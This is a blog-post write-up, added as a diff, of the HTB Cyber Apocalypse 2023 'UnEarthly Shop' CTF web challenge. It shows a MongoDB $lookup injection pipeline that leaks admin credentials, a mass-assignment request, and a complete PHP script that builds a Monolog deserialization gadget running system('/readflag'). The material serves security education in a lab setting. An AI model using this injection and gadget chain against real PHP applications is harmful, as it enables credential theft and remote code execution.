@@ -1,0 +1,145 @@
+---
+title: 'UnEarthly Shop: MongoDB Aggregation to PHP Object Injection'
+description: 'An HTB Cyber Apocalypse 2023 write-up chaining MongoDB $lookup, mass assignment, and autoloader abuse to reach a Monolog deserialization gadget and execute /readflag.'
+date: 2026-09-05
+tags:
+  - writeup
+  - mongodb
+  - nosql-injection
+  - mass-assignment
+  - php-deserialization
+  - php-object-injection
+  - rce
+category: web
+difficulty: hard
+ctf_event: 'HTB Cyber Apocalypse 2023 — The Cursed Mission'
+draft: false
+---
+
+I worked through this hard web challenge from HTB Cyber Apocalypse 2023 locally after reading other write-ups.
+
+The chain: **MongoDB `$lookup` → admin credentials → mass assignment → PHP object injection → `/readflag`**.
+
+## 1. Leak the admin credentials
+
+The application has a frontend shop and a backend admin panel at `/admin`. In `ShopController.php`, `POST /api/products` passes user input to MongoDB's `aggregate()` method.
+
+Send this pipeline with `Content-Type: application/json` to join products with the `users` collection:
+
+```json
+[
+  { "$match": { "instock": true } },
+  {
+    "$lookup": {
+      "from": "users",
+      "localField": "_id",
+      "foreignField": "_id",
+      "as": "xon1l"
+    }
+  }
+]
+```
+
+A product and the admin user share `_id: 1`, so the response exposes the admin's username, plaintext password, and serialized `access` value. Use the credentials to log in to `/admin`.
+
+![MongoDB $lookup returns the admin credentials.](/uploads/unearthly-shop/mongodb-lookup-credentials.png)
+
+## 2. Control the serialized access value
+
+The backend's `UserModel` deserializes a permissions value from the session:
+
+```php
+$this->access = unserialize($_SESSION['access'] ?? '');
+```
+
+The `/admin/api/users/update` endpoint accepts extra fields, including `access`. This mass assignment vulnerability lets us replace the permissions string in MongoDB. Logging in again copies the modified value into the session, where it reaches `unserialize()`.
+
+## 3. Load the Monolog gadget
+
+[PHPGGC's Monolog/RCE7 chain](https://github.com/ambionics/phpggc/blob/master/gadgetchains/Monolog/RCE/7/chain.php) provides a suitable gadget, but Monolog is installed in the frontend while deserialization happens in the backend.
+
+The backend's custom autoloader replaces underscores in class names with slashes and includes the matching PHP file:
+
+```text
+www_frontend_vendor_autoload
+    → /www/frontend/vendor/autoload.php
+```
+
+Putting an object with this class name first in the serialized array loads the frontend's Composer autoloader. PHP can then resolve the Monolog object that follows it. The first class does not need to exist; including the autoloader is the useful side effect.
+
+Autoloading happens when PHP resolves an undefined class. `unserialize()` does not call `__construct()`; this gadget executes through `__destruct()`.
+
+## 4. Generate the payload
+
+Save the following as `generate.php`. These minimal classes create the serialized structure; the server supplies the actual Monolog implementation.
+
+```php
+<?php
+
+namespace Monolog\Handler {
+    class FingersCrossedHandler
+    {
+        protected $passthruLevel = 0;
+        protected $handler;
+        protected $buffer;
+        protected $processors;
+
+        public function __construct($methods, $command)
+        {
+            $this->processors = $methods;
+            $this->buffer = [$command];
+            $this->handler = $this;
+        }
+    }
+}
+
+namespace {
+    class www_frontend_vendor_autoload {}
+
+    $autoload = new www_frontend_vendor_autoload();
+    $gadget = new \Monolog\Handler\FingersCrossedHandler(
+        ['pos', 'system'],
+        ['/readflag', 'level' => 0]
+    );
+
+    echo json_encode(serialize([$autoload, $gadget])), PHP_EOL;
+}
+```
+
+Run `php generate.php`. The gadget's handler points to itself, so destruction flushes the buffered record through its processors: `pos()` extracts `/readflag`, and `system()` executes it.
+
+`json_encode()` preserves quotes, backslashes, and NUL bytes. Use the complete output as the JSON value of `access`, without adding another pair of quotes.
+
+## 5. Update the admin and get the flag
+
+While authenticated, send this body to `POST /admin/api/users/update`, replacing the placeholders with the admin password and generated payload:
+
+```json
+{
+  "_id": 1,
+  "username": "admin",
+  "password": "<admin password>",
+  "access": "<serialized payload>"
+}
+```
+
+Log in again, then visit an authenticated backend route to trigger deserialization. If you also change the password—as I did in the screenshot—use the new password.
+
+![The injected access payload produces the flag in the response.](/uploads/unearthly-shop/php-object-injection-flag.png)
+
+The response redirects to `Access Denied`, but its body contains the flag: failing a permission check does not stop the injected object's destructor from running.
+
+```text
+HTB{l00kup_4r7if4c75_4nd_4u70lo4d_g4dg37s}
+```
+
+The key was connecting control of `access` with a way to load the gadget. Finding `unserialize()` alone was not enough.
+
+## References
+
+- [Nguyen Anh Tien's write-up](https://viblo.asia/p/write-up-htbctf-cyber-apocalypse-2023-the-cursed-mission-web-unearthly-shop-38X4ENGXJN2), which helped me solve the challenge.
+- [MongoDB aggregation](https://www.mongodb.com/docs/manual/reference/method/db.collection.aggregate/).
+- [PHPGGC Monolog/RCE7 gadget](https://github.com/ambionics/phpggc/blob/master/gadgetchains/Monolog/RCE/7/gadgets.php).
+- [PHP deserialization](https://www.php.net/manual/en/function.unserialize.php) and [autoloading](https://www.php.net/manual/en/language.oop5.autoload.php).
+- [Practical PHP Object Injection](https://insomniasec.com/cdn-assets/Practical_PHP_Object_Injection.pdf).
+- [Unserializable, but unreachable](https://www.ambionics.io/blog/vbulletin-unserializable-but-unreachable).
